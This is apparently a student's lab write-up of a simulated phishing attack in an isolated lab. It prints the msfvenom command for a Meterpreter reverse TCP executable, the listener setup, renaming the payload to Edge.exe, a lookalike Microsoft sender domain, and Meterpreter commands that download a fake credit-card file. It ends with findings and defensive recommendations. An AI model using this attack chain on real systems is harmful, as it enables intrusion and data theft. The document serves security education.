# Metasploit Reverse TCP Payload and Phishing Simulation Lab

<p align="center">
  <strong>Payload Generation, Social Engineering, Meterpreter Access, and Simulated Data Exfiltration</strong>
</p>

---

## Overview

This lab demonstrates how an attacker can combine a reverse TCP payload, a phishing email, and social engineering to gain remote access to a Windows system.

Using Kali Linux and the Metasploit Framework, I generated a Windows x64 Meterpreter reverse TCP executable, configured a listener, disguised the payload as a Microsoft Edge installer, and delivered it through a simulated phishing email. After the attachment was saved and executed on the Windows target, the payload connected back to the Metasploit listener and opened a Meterpreter session. I then navigated the target system and downloaded a simulated confidential file.

> **Authorized Lab Notice:** All activity in this repository was completed in an isolated educational lab using intentionally provided virtual machines. The techniques shown here must only be used on systems you own or have explicit permission to test.

## Lab Objectives

- Identify the Kali Linux attack system's IP address.
- Generate a Windows x64 Meterpreter reverse TCP payload with `msfvenom`.
- Disguise the executable as a legitimate-looking Microsoft Edge file.
- Configure a Metasploit `multi/handler` listener.
- Compose and send a simulated phishing email with the payload attached.
- Save and execute the attachment on the Windows target.
- Establish a Meterpreter session.
- Navigate the target file system.
- Download and inspect a simulated confidential file.
- Close the Meterpreter and Metasploit sessions safely.

## Lab Environment

| Component | Details |
|---|---|
| Attack System | `ZYKALI01` |
| Attack Operating System | Kali Linux |
| Target System | `ZYWIN01` |
| Target Operating System | Windows Server 2022 |
| Exploitation Framework | Metasploit Framework |
| Payload Generator | MSFvenom |
| Email Client | Thunderbird |
| Payload | `windows/x64/meterpreter/reverse_tcp` |
| Listener Port | TCP `5555` |
| Simulated Payload Name | `Edge.exe` |
| Simulated Confidential File | `CreditCards.txt` |

## Tools and Technologies

- Kali Linux
- Windows Server 2022
- Metasploit Framework
- MSFconsole
- MSFvenom
- Meterpreter
- Thunderbird
- Reverse TCP shell
- Social engineering and phishing simulation

---

# Attack Flow

```text
ZYKALI01 (Kali Linux)
        │
        │ 1. Generate reverse TCP payload
        ▼
payload.exe renamed to Edge.exe
        │
        │ 2. Attach payload to phishing email
        ▼
ZYWIN01 (Windows Server 2022)
        │
        │ 3. User saves and executes Edge.exe
        ▼
Reverse TCP connection to Kali listener
        │
        │ 4. Meterpreter session opens
        ▼
Remote file access and simulated data download
```

---

# Task 1: Create the Payload and Configure a Listener

## Step 1: Identify the Kali Linux IP Address

I opened a terminal on `ZYKALI01` and displayed the system's network interfaces:

```bash
ip a
```

The IPv4 address assigned to the Kali system was used as the `LHOST` value when generating the payload and configuring the listener.

<p align="center">
  <img src="https://github.com/user-attachments/assets/4decd796-fbe8-4427-9944-5193c041a934"
       alt="Linux forensic investigation evidence"
       width="800">
</p>xxxxxxxxx

<p align="center">
  <em>Figure 1: The `ZYKALI01` IPv4 address identified with the `ip a` command.</em>
</p>

## Step 2: Start the Metasploit Framework

I launched Metasploit from the Kali terminal:

```bash
sudo msfconsole
```

MSFconsole provides access to Metasploit modules, payloads, listeners, and post-exploitation features.

## Step 3: Generate the Reverse TCP Payload

Inside MSFconsole, I used MSFvenom to create a Windows x64 Meterpreter reverse TCP executable:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  --platform windows \
  -a x64 \
  LHOST=<ZYKALI01-IP-ADDRESS> \
  LPORT=5555 \
  -f exe \
  -o /home/kali/payload.exe
```

### Payload Parameters

| Parameter | Purpose |
|---|---|
| `-p windows/x64/meterpreter/reverse_tcp` | Selects the Windows x64 Meterpreter reverse TCP payload |
| `--platform windows` | Sets Windows as the target platform |
| `-a x64` | Sets the target architecture to 64-bit |
| `LHOST` | Sets the Kali Linux callback address |
| `LPORT=5555` | Sets TCP port 5555 for the callback |
| `-f exe` | Creates a Windows executable |
| `-o /home/kali/payload.exe` | Saves the generated payload to the Kali home directory |

<p align="center">
  <img src="https://github.com/user-attachments/assets/126e4ab3-3233-4e42-b5ec-0080e526f2a1"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

<p align="center">
  <em>Figure 2: MSFvenom generating the Windows x64 Meterpreter reverse TCP payload.</em>
</p>

## Step 4: Rename the Payload

To simulate an attacker disguising the malicious file as a legitimate browser installer, I copied the payload to a new filename:

```bash
cp /home/kali/payload.exe /home/kali/Edge.exe
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/844d4018-0236-4e77-88f7-caae67cd9c08"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

<p align="center">
  <em>Figure 3: The generated payload copied and renamed as `Edge.exe`.</em>
</p>

## Step 5: Configure the Metasploit Listener

I configured a Metasploit multi-handler to receive the reverse TCP connection:

```text
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ZYKALI01-IP-ADDRESS>
set LPORT 5555
exploit
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/528ab366-844f-4e37-83a2-8c972e5cca59"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

<p align="center">
  <em>Figure 4: Metasploit `multi/handler` listening for a reverse TCP connection on port `5555`.</em>
</p>

---

# Task 2: Compose and Send the Simulated Phishing Email

## Step 1: Open Thunderbird

I opened Thunderbird on `ZYKALI01` and selected the simulated sender account:

```text
mark@support.microsofl.com
```

The domain was intentionally designed to resemble a legitimate Microsoft support domain while containing a misspelling.

## Step 2: Compose the Message

I created an email addressed to:

```text
bob@mycompany.com
```

The message falsely claimed that the attachment contained the latest Microsoft Edge release.

### Social Engineering Indicators

- Lookalike sender domain
- Generic greeting
- Request to save and run an executable attachment
- Brand impersonation
- Urgent or authoritative wording
- Unsigned executable file

## Step 3: Attach `Edge.exe`

I selected `Edge.exe` from the Kali home directory and attached it to the email.

<p align="center">
  <img src="https://github.com/user-attachments/assets/4ac82f8a-f0a9-4afd-a208-a0ee479efb02"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

<p align="center">
  <em>Figure 5: Simulated phishing email prepared with the disguised `Edge.exe` payload attached.</em>
</p>

## Step 4: Send the Email

The message was sent from the simulated lookalike account to the target user.

```text
From: mark@support.microsofl.com
To: bob@mycompany.com
Attachment: Edge.exe
```

---

# Task 3: Save and Execute the Attachment on the Target

## Step 1: Open the Message on `ZYWIN01`

On the Windows Server target, I opened Thunderbird and selected the phishing message in Bob's inbox.

<p align="center">
  <img src="https://github.com/user-attachments/assets/068ed828-1780-4dd8-a15c-17e88f53ccb4"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

<p align="center">
  <em>Figure 6: The simulated phishing email received in Bob's Thunderbird inbox.</em>
</p>

## Step 2: Save the Attachment

I saved `Edge.exe` to the Windows desktop.

<p align="center">
  <img src="https://github.com/user-attachments/assets/01bae421-423c-40b9-a691-3b617eb4a026"
       alt="Linux forensic investigation evidence"
       width="680">
</p>

<p align="center">
  <em>Figure 7: The `Edge.exe` attachment saved to the target system's desktop.</em>
</p>

## Step 3: Execute the Payload

I double-clicked `Edge.exe`. Windows displayed an **Open File - Security Warning** stating that the publisher could not be verified and that the file did not have a valid digital signature.

<p align="center">
  <img src="https://github.com/user-attachments/assets/4d34cc57-ff3d-466b-85cc-f909ab4197ef"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

<p align="center">
  <em>Figure 8: Windows warning that `Edge.exe` had an unknown publisher and no valid digital signature.</em>
</p>

---

# Task 4: Open a Meterpreter Session and Access the Target

## Step 1: Confirm the Reverse Connection

After `Edge.exe` executed, it connected back to the Metasploit listener on `ZYKALI01`.

<p align="center">
  <img src="https://github.com/user-attachments/assets/e48d2446-ee84-4bee-8765-04e118abe16b"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

<p align="center">
  <em>Figure 9: Meterpreter reverse TCP session established between `ZYWIN01` and the Kali listener.</em>
</p>

## Step 2: Navigate the Target File System

From the Meterpreter prompt, I displayed the current directory and navigated to Bob's Documents folder:

```text
pwd
cd 'C:\Users\Bob\Documents'
dir
```

## Step 3: Download the Simulated Confidential File

I downloaded the lab-provided file from the Windows target to Kali:

```text
download CreditCards.txt /home/kali/
```

The file was copied from:

```text
C:\Users\Bob\Documents\CreditCards.txt
```

to:

```text
/home/kali/CreditCards.txt
```

I then displayed the file in a Kali terminal:

```bash
cat /home/kali/CreditCards.txt
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/8027fe11-897a-4394-8f79-10abf961cabf"
       alt="Linux forensic investigation evidence"
       width="49%">
  <img src="https://github.com/user-attachments/assets/4bfa0479-422b-4013-a777-86fd42fa3cc3"
       alt="Linux forensic investigation evidence"
       width="49%">
</p>


<p align="center">
  <em>Figure 10: Simulated confidential file downloaded from the Windows target and displayed on Kali Linux.</em>
</p>

## Step 4: Close the Sessions

I safely closed the remote session and exited Metasploit:

```text
exit
exit
```
<p align="center">
  <img src="https://github.com/user-attachments/assets/dba62aae-7081-4400-b8fe-bcdd6e62db0d"
       alt="Linux forensic investigation evidence"
       width="800">
</p>

---

# Evidence Summary

| Stage | Evidence |
|---|---|
| Reconnaissance | Kali IPv4 address identified with `ip a` |
| Payload Creation | Windows x64 Meterpreter reverse TCP executable generated |
| Masquerading | `payload.exe` copied to `Edge.exe` |
| Command and Control | Metasploit listener configured on TCP port 5555 |
| Social Engineering | Lookalike Microsoft support domain used in a phishing email |
| Delivery | `Edge.exe` attached and sent through Thunderbird |
| User Execution | Attachment saved and executed on Windows Server 2022 |
| Initial Access | Meterpreter session opened after the reverse connection |
| Discovery | Bob's Documents directory listed remotely |
| Collection | `CreditCards.txt` located on the target |
| Exfiltration Simulation | File downloaded to `/home/kali/` |
| Cleanup | Meterpreter and Metasploit sessions closed |

# Security Findings

## Finding 1: Lookalike Email Domain

The sender address used `support.microsofl.com`, which visually resembled a legitimate Microsoft domain. This demonstrated how a minor spelling change can be used to impersonate a trusted company.

## Finding 2: Executable Email Attachment

The message delivered an `.exe` attachment while presenting it as a browser update. Executable email attachments should be blocked or quarantined unless explicitly required.

## Finding 3: Unknown Publisher Warning

Windows warned that the executable came from an unknown publisher and lacked a valid digital signature. This warning was a strong indicator that the file should not be trusted.

## Finding 4: Reverse TCP Command-and-Control Channel

The payload initiated an outbound connection to the Kali system on TCP port 5555. Monitoring unusual outbound connections can help identify reverse shells and command-and-control activity.

## Finding 5: Unauthorized Remote File Access

The Meterpreter session allowed remote directory navigation and file download. Endpoint detection, least privilege, network segmentation, and outbound filtering can reduce the impact of this type of compromise.

# Defensive Recommendations

- Block executable attachments at the email gateway.
- Use sender-domain protection, anti-spoofing controls, and lookalike-domain detection.
- Train users to inspect sender addresses and avoid running unexpected attachments.
- Require application allowlisting for sensitive systems.
- Deploy endpoint detection and response software.
- Alert on unsigned executables launched from user-writable locations.
- Restrict unnecessary outbound traffic and monitor unusual ports.
- Use least-privilege accounts instead of administrative accounts for routine work.
- Segment servers from user workstations and untrusted systems.
- Monitor process creation, file downloads, and abnormal network callbacks.
- Use multifactor authentication and strong access controls for sensitive resources.
- Investigate security warnings instead of bypassing them.

# Key Takeaways

- A technically simple payload can become effective when combined with social engineering.
- Lookalike domains and familiar brand names can make malicious messages appear legitimate.
- Windows security warnings provide important evidence that an executable may be unsafe.
- Reverse TCP payloads require the target to initiate the connection, which may bypass poorly configured inbound-only controls.
- Email filtering, endpoint monitoring, outbound traffic analysis, and user awareness work best when used together.
- A successful investigation should document the full chain from payload generation through execution, remote access, and data movement.

---

> This repository is intended for cybersecurity education, defensive awareness, and authorized penetration-testing practice only.
